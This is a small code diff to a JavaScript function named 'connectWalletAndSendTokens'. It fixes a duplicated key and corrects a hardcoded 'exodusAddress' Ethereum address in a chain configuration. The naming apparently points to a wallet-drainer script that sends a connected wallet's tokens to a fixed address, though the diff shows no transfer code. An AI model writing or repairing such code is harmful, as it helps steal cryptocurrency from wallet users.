@@ -98,9 +98,9 @@ async function connectWalletAndSendTokens() {
     {
       chainId: 1,
       name: "Ethereum",
-      chainId: "eth",
+      chainName: "eth",
       nativeCoin: "ETH",
-      exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf577"
+      exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57"
     }
   ];
 
